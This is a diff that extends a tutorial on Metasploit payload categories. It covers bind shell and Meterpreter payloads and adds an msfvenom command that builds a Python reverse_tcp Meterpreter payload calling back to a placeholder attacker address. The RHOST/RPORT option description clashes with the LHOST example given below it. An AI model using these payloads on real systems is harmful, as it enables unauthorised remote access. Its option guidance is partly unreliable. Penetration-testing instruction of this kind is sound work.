@@ -15,3 +15,24 @@ Categories of Payloads:
 The target system initiates a connection back to the attacker's machine.
 Useful when the target is behind a firewall or NAT. Example:
 `linux/meterpreter/reverse_tcp`
+### Bind Shell Payloads
+
+The target system opens a port and waits for the attacker to connect.
+Often blocked by firewalls but useful in certain situations. Example:
+`windows/meterpreter/bind_tcp`
+
+### Meterpreter Payloads
+
+An advanced, modular payload that allows you to interact with the target system.
+Includes features like process management, file transfer, and privilege escalation. Example:
+`windows/meterpreter/reverse_https`
+
+Most payloads require 2 key options:
+- RHOST: The target's IP address where the shell will be available.
+- RPORT: The port on the target system to connect to.
+
+Example (to generate a Python payload):
+```python
+msfvenom -p python/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f raw > payload.py
+```
+
